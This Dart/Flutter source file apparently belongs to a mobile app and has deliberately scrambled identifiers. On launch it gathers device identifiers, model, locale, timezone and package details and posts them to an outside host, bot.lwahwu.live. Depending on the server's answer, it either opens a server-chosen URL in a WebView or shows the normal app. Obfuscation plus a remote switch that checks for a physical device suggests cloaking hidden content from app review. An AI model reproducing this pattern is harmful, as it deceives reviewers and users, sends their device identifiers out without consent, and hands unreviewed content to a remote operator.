import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var yfsnejtgb = RxBool(false);
  var zbhwek = RxBool(true);
  var vfgax = RxString("");
  var mckayla = RxBool(false);
  var carroll = RxBool(true);
  final zkvgcatfwh = Dio();


  InAppWebViewController? webViewController;

  void checkNet() async {
    var connectResult = await (Connectivity().checkConnectivity());
    if(connectResult == ConnectivityResult.none){
      Get.toNamed("/check_net");
    }
  }

  @override
  void onInit() {
    checkNet();
    super.onInit();
    fiuknwrh();
  }


  Future<void> fiuknwrh() async {

    mckayla.value = true;
    carroll.value = true;
    zbhwek.value = false;

    zkvgcatfwh.post("https://bot.lwahwu.live/DLTYKMYVL",data: await jizycd()).then((value) {
      var cetwgm = value.data["cetwgm"] as String;
      var qysunmk = value.data["qysunmk"] as bool;
      if (qysunmk) {
        vfgax.value = cetwgm;
        vanessa();
      } else {
        cartwright();
      }
    }).catchError((e) {
      zbhwek.value = true;
      carroll.value = true;
      mckayla.value = false;
    });
  }

  Future<Map<String, dynamic>> jizycd() async {
    final DeviceInfoPlugin jlnkxp = DeviceInfoPlugin();
    PackageInfo lohtv_cwglo = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var geqkhoit = Platform.localeName;
    var BUugH = currentTimeZone;

    var uMVmTkA = lohtv_cwglo.packageName;
    var sEpS = lohtv_cwglo.version;
    var ilWeI = lohtv_cwglo.buildNumber;

    var FcYGpIHE = lohtv_cwglo.appName;
    var sSTeUBym = "";
    var mAgeDQHp  = "";
    var rodBoyer = "";
    var GNQtO = "";
    var onaJacobson = "";
    var floKovacek = "";
    var wyattWeimann = "";
    var kaseyFeil = "";

    var fabianGorczany = "";

    var IqEpakG = "";
    var gunJYmZ = false;

    if (GetPlatform.isAndroid) {
      IqEpakG = "android";
      var bumvzf = await jlnkxp.androidInfo;

      GNQtO = bumvzf.brand;

      sSTeUBym  = bumvzf.model;
      mAgeDQHp = bumvzf.id;

      gunJYmZ = bumvzf.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      IqEpakG = "ios";
      var edgscih = await jlnkxp.iosInfo;
      GNQtO = edgscih.name;
      sSTeUBym = edgscih.model;

      mAgeDQHp = edgscih.identifierForVendor ?? "";
      gunJYmZ  = edgscih.isPhysicalDevice;
    }

    var res = {
      "ilWeI": ilWeI,
      "fabianGorczany" : fabianGorczany,
      "sEpS": sEpS,
      "uMVmTkA": uMVmTkA,
      "sSTeUBym": sSTeUBym,
      "rodBoyer" : rodBoyer,
      "BUugH": BUugH,
      "GNQtO": GNQtO,
      "mAgeDQHp": mAgeDQHp,
      "geqkhoit": geqkhoit,
      "IqEpakG": IqEpakG,
      "gunJYmZ": gunJYmZ,
      "onaJacobson" : onaJacobson,
      "floKovacek" : floKovacek,
      "wyattWeimann" : wyattWeimann,
      "FcYGpIHE": FcYGpIHE,
      "kaseyFeil" : kaseyFeil,

    };
    return res;
  }

  Future<void> cartwright() async {
    Get.offAllNamed("/curingTab");
  }

  Future<void> vanessa() async {
    Get.offAllNamed("/curingLoop");
  }

}
